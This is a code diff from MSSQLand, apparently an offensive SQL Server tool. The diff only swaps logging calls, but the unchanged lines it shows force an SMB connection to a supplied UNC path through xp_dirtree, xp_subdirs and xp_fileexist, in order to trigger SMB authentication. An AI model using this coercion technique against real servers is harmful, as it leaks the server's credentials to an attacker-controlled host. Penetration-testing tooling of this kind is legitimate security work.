@@ -62,7 +62,7 @@ namespace MSSQLand.Actions.Remote
         /// <param name="databaseContext">The ConnectionManager instance to execute the query.</param>
         public override object Execute(DatabaseContext databaseContext)
         {
-            Logger.Task($"Sending SMB request to: {_uncPath}");
+            Logger.Info($"Sending SMB request to: {_uncPath}");
 
             // Method 1: Try xp_dirtree (most common)
             if (TryXpDirtree(databaseContext))
@@ -94,7 +94,7 @@ namespace MSSQLand.Actions.Remote
         {
             try
             {
-                Logger.TaskNested("Trying xp_dirtree method");
+                Logger.InfoNested("Trying xp_dirtree method");
 
                 string query = $"EXEC master..xp_dirtree '{_uncPath}'";
                 databaseContext.QueryService.ExecuteNonProcessing(query);
@@ -116,7 +116,7 @@ namespace MSSQLand.Actions.Remote
         {
             try
             {
-                Logger.TaskNested("Trying xp_subdirs method");
+                Logger.InfoNested("Trying xp_subdirs method");
 
                 string query = $"EXEC master..xp_subdirs '{_uncPath}'";
                 databaseContext.QueryService.ExecuteNonProcessing(query);
@@ -138,7 +138,7 @@ namespace MSSQLand.Actions.Remote
         {
             try
             {
-                Logger.TaskNested("Trying xp_fileexist method");
+                Logger.InfoNested("Trying xp_fileexist method");
 
                 // xp_fileexist requires a file path, append a file
                 string filePath = _uncPath.TrimEnd('\\') + "\\data.txt";
@@ -146,7 +146,7 @@ namespace MSSQLand.Actions.Remote
                 databaseContext.QueryService.ExecuteNonProcessing(query);
 
                 Logger.Success("SMB request sent successfully using xp_fileexist");
-                Logger.TaskNested("Note: xp_fileexist was used with a dummy file path to trigger SMB authentication");
+                Logger.InfoNested("Note: xp_fileexist was used with a dummy file path to trigger SMB authentication");
                 return true;
             }
             catch (Exception ex)
